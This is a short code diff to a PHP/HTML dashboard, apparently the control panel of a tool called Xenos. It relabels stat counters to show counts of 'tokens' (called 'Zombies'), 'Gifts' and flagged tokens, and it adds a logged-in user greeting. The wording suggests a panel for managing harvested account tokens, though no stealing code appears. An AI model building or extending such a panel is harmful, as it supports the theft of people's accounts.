@@ -28,18 +28,18 @@
         </div> -->
         <div class="stats">
             <div class="stat">
-                <span><?=ZombiesCount();?></span>
+                <span><?=GetCount("tokens");?></span>
                 <p>Zombies</p>
             </div>
 
             <div class="stat">
-                <span>0</span>
-                <p>Devices</p>
+                <span><?=GetCount("gifts");?></span>
+                <p>Gifts</p>
             </div>
 
             <div class="stat">
-                <span>0</span>
-                <p>Users</p>
+            <span><?=GetFlagedCount();?>/<?=GetCount("tokens");?></span>
+                <p>Flaged</p>
             </div>
         </div>
     </section>
@@ -49,9 +49,18 @@
     <section class="section_owners">
         <div class="owners">
             <div class="owner">
+                <img src="<?=$_SESSION["login_avatar"]?>" alt="" srcset="">
+                <!-- <span><?=$_SESSION["login_username"]?></span> -->
+                <p>Your are successfully connected to Xenos as <strong><?=$_SESSION["login_username"]?></strong></p>
+            </div>
+        </div>
+    </section>
+    <section class="section_owners">
+        <div class="owners">
+            <div class="owner">
                 <img src="assets/images/kaneki.gif" alt="" srcset="">
-                <span>Kaneki Web</span>
-                <p>French Developer, frontend, backend, <br>python, node, Csharp...</p>
+                <span>ParadoxW3b</span>
+                <p>Self Taught & FreeLance Developer !</p>
                 <a target="_blank" href="https://github.com/KanekiWeb">Follow</a>
             </div>
         </div>
